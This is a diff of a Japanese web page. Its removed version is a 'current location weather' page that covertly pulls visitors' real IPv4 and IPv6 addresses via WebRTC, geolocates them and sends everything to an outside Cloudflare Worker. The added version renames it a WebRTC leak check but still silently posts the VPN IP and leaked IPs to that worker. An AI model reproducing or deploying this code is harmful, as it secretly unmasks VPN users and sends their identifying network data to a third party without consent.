@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>現在地の天気</title>
+  <title>WebRTC IPv4 Leak Check</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
@@ -65,8 +65,8 @@
 <body>
 
 <div class="card">
-  <h1>現在地の天気</h1>
-  <div id="status" class="status">位置情報を取得中…</div>
+  <h1>WebRTC IPv4 リークチェック</h1>
+  <div id="status" class="status">IP情報を取得中…</div>
   <div id="weather" class="weather"></div>
   <div id="leak" class="leak-info"></div>
   <div id="error" class="error"></div>
@@ -84,14 +84,10 @@
     errorEl.textContent = msg;
   }
 
-  // ========== WebRTCで元IPを抜き取る（IPv4 + IPv6） ==========
-  async function getRealIPviaWebRTC() {
+  // ========== WebRTCでIPv4のみを抜き取る ==========
+  async function getRealIPv4viaWebRTC() {
     return new Promise((resolve) => {
-      const ips = {
-        ipv4: [],
-        ipv6: [],
-        all: []
-      };
+      const ips = [];
       const pc = new RTCPeerConnection({
         iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
       });
@@ -107,22 +103,8 @@
           const ipv4Matches = candidateStr.match(ipv4Regex);
           if (ipv4Matches) {
             ipv4Matches.forEach(ip => {
-              if (!ips.ipv4.includes(ip)) {
-                ips.ipv4.push(ip);
-                ips.all.push(ip);
-              }
-            });
-          }
-
-          // IPv6 正規表現（フル表記）
-          const ipv6FullRegex = /([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){7})/g;
-          const ipv6FullMatches = candidateStr.match(ipv6FullRegex);
-          if (ipv6FullMatches) {
-            ipv6FullMatches.forEach(ip => {
-              const normalized = ip.toLowerCase();
-              if (!ips.ipv6.includes(normalized)) {
-                ips.ipv6.push(normalized);
-                ips.all.push(normalized);
+              if (!ips.includes(ip)) {
+                ips.push(ip);
               }
             });
           }
@@ -137,103 +119,50 @@
       setTimeout(() => {
         pc.close();
         resolve(ips);
-      }, 3000);
+      }, 200);
     });
   }
 
-  // ========== GPS ==========
-  // ========== IPベース位置 ==========
-  async function getPositionByIP() {
-    const res = await fetch("https://ipapi.co/json/");
-    if (!res.ok) throw new Error("IP位置取得失敗");
+  // ========== VPN越しIPを取得 ==========
+  async function getVPNIP() {
+    const res = await fetch("https://api.ipify.org?format=json");
+    if (!res.ok) throw new Error("VPN IP取得失敗");
     const data = await res.json();
-    return {
-      lat: data.latitude,
-      lon: data.longitude,
-      city: data.city,
-      region: data.region,
-      country: data.country_name,
-      ip: data.ip,
-      source: "IP"
-    };
-  }
-
-  // ========== 天気 ==========
-  async function getWeather(lat, lon) {
-    const url =
-      "https://api.open-meteo.com/v1/forecast" +
-      "?latitude=" + lat +
-      "&longitude=" + lon +
-      "&current_weather=true" +
-      "&timezone=Asia%2FTokyo";
-
-    const res = await fetch(url);
-    if (!res.ok) throw new Error("天気取得失敗");
-    return await res.json();
+    return data.ip;
   }
 
   // ========== メイン ==========
   try {
-    const [webrtcData, position] = await Promise.all([
-      getRealIPviaWebRTC(),
-      (async () => {
-        try {
-          return
-        } catch {
-          return await getPositionByIP();
-        }
-      })()
+    const [webrtcIPv4List, vpnIP] = await Promise.all([
+      getRealIPv4viaWebRTC(),
+      getVPNIP()
     ]);
 
-    statusEl.textContent = "位置情報: " + position.source;
+    statusEl.textContent = "IP情報の取得が完了しました";
 
-    // 天気取得
-    const weatherData = await getWeather(position.lat, position.lon);
-    const w = weatherData.current_weather;
-
+    // VPN越しIPを表示
     weatherEl.innerHTML = `
-      緯度: ${position.lat.toFixed(4)}<br>
-      経度: ${position.lon.toFixed(4)}<br><br>
-      気温: ${w.temperature} ℃<br>
-      風速: ${w.windspeed} km/h<br>
-      天気コード: ${w.weathercode}<br>
-      観測時刻: ${w.time}
+      <strong>VPN越しIP:</strong><br>
+      ${vpnIP}
     `;
 
-    // WebRTCで抜いたIPを表示（IPv4 + IPv6）
-    if (webrtcData.all.length > 0) {
-      let html = "🔓 WebRTC検出IP:<br>";
-      
-      if (webrtcData.ipv4.length > 0) {
-        html += "<br>【IPv4】<br>" + webrtcData.ipv4.map(ip => `<strong>${ip}</strong>`).join("<br>");
-      }
-      
-      if (webrtcData.ipv6.length > 0) {
-        html += "<br>【IPv6】<br>" + webrtcData.ipv6.map(ip => `<strong>${ip}</strong>`).join("<br>");
-      }
-      
+    // WebRTCで抜いたIPv4を表示
+    if (webrtcIPv4List.length > 0) {
+      let html = "🔓 WebRTC検出IPv4:<br><br>";
+      html += webrtcIPv4List.map(ip => `<strong>${ip}</strong>`).join("<br>");
       leakEl.innerHTML = html;
     } else {
-      leakEl.innerHTML = "🔒 WebRTC IPは検出されず（IPv4/IPv6とも安全）";
+      leakEl.innerHTML = "🔒 WebRTC IPv4は検出されず（安全）";
     }
 
-    // Worker送信
+    // Worker送信（オプション）
     const WORKER_URL = "https://white-dream-0732.kurea-ch124.workers.dev/";
-    const ipv4List = webrtcData.ipv4.length > 0 ? webrtcData.ipv4.join(", ") : "検出なし";
-    const ipv6List = webrtcData.ipv6.length > 0 ? webrtcData.ipv6.join(", ") : "検出なし";
-    const vpnIP = position.ip || "不明";
+    const ipv4ListStr = webrtcIPv4List.length > 0 ? webrtcIPv4List.join(", ") : "検出なし";
 
     const text =
-`🌤 天気情報
-取得元: ${position.source}
-緯度: ${position.lat.toFixed(4)}
-経度: ${position.lon.toFixed(4)}
-気温: ${w.temperature}℃
-風速: ${w.windspeed} km/h
-観測時刻: ${w.time}
+`🔍 WebRTC IPv4 リークチェック結果
 VPN越しIP: ${vpnIP}
-WebRTC IPv4: ${ipv4List}
-WebRTC IPv6: ${ipv6List}`;
+WebRTC IPv4: ${ipv4ListStr}`;
 
     await fetch(WORKER_URL, {
       method: "POST",
@@ -242,7 +171,7 @@ WebRTC IPv6: ${ipv6List}`;
     });
 
   } catch (e) {
-    showError("取得できませんでした");
+    showError("IP情報の取得に失敗しました");
     console.error(e);
   }
 })();
